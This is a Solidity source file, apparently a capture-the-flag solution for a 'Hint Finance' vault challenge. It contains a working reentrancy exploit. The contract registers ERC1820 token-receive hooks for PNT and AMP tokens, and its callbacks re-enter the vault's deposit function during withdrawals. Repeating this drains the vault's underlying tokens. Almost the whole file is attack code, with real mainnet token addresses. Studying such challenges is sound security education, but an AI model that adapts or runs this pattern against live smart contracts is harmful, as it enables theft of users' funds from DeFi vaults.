// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.15;

import "forge-std/Script.sol";
import "./Setup.sol";
import "./HintFinanceVault.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}


contract Solution {


    bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH =
    0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
    IERC1820Registry constant internal _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);


    address[2] public underlyingTokens = [
    0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD, // PNT
    // 0x3845badAde8e6dFF049820680d1F14bD3903a5d0, // SAND
    0xfF20817765cB7f73d4bde2e66e067E58D11095C2 // AMP
    ];
    mapping(address => uint256) public initialBal;
    mapping(address => HintFinanceVault) public vaults;
    mapping(address => bool) public completed;

    UniswapV2RouterLike router = UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    Setup setup = Setup(0x718aD274b84107c3A9642faEA75dc3a19eDE5Ae2);
    HintFinanceFactory hfFactory;

    // we need to get a small portion to start the exploit.
    constructor() payable {
        address[] memory path = new address[](2);
        path[0] = weth;

        for (uint256 i = 0; i < underlyingTokens.length; ++i) {
            // swap for underlying tokens
            path[1] = underlyingTokens[i];
            router.swapExactETHForTokens{value : 1000 ether}(0, path, address(this), block.timestamp);
            initialBal[underlyingTokens[i]] = ERC20Like(underlyingTokens[0]).balanceOf(address(this));
            completed[underlyingTokens[i]] = false;
        }
        hfFactory = HintFinanceFactory(setup.hintFinanceFactory());
        checkBal();
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("AmpTokensRecipient"), address(this));
    }

    function checkBal() internal view {
        for (uint256 i = 0; i < underlyingTokens.length; ++i) {
            console.log(i, ERC20Like(underlyingTokens[i]).balanceOf(address(this)));
        }
    }

    function Exploit() public {


        for (uint256 i = 0; i < underlyingTokens.length; ++i) {
            address vault = hfFactory.underlyingToVault(underlyingTokens[i]);
            uint256 vaultUnderlyingBalance = ERC20Like(underlyingTokens[i]).balanceOf(vault);
            console.log("vault init bal", vaultUnderlyingBalance);
            ERC20Like(underlyingTokens[i]).approve(vault, type(uint256).max);

            vaults[underlyingTokens[i]] = HintFinanceVault(vault);
            uint shares = vaults[underlyingTokens[i]].deposit(initialBal[underlyingTokens[i]]);

            // exploit
            for (uint j = 0; j < 3; j++) {
                uint bal = vaults[underlyingTokens[i]].balanceOf(address(this));
                vaults[underlyingTokens[i]].withdraw(bal);
            }

            completed[underlyingTokens[i]] = true;
            uint bal = vaults[underlyingTokens[i]].balanceOf(address(this));
            vaults[underlyingTokens[i]].withdraw(bal);
            //            uint bal = vaults[underlyingTokens[i]].balanceOf(address(this));
            //            vaults[underlyingTokens[i]].withdraw(bal);

            console.log("vault post bal", ERC20Like(underlyingTokens[i]).balanceOf(vault));
        }
        checkBal();
    }

    // for underlyingTokens[0]: PNT
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (completed[msg.sender] == false) {
            vaults[msg.sender].deposit(ERC20Like(msg.sender).balanceOf(address(this)));
        }
    }

    // for underlyingTokens[2]: AMP:
    function tokensReceived(bytes4 functionSig, bytes32 partition, address operator, address from, address to, uint256 value, bytes calldata data, bytes calldata operatorData) external {
        if (completed[msg.sender] == false) {
            vaults[msg.sender].deposit(ERC20Like(msg.sender).balanceOf(address(this)));
        }
    }
}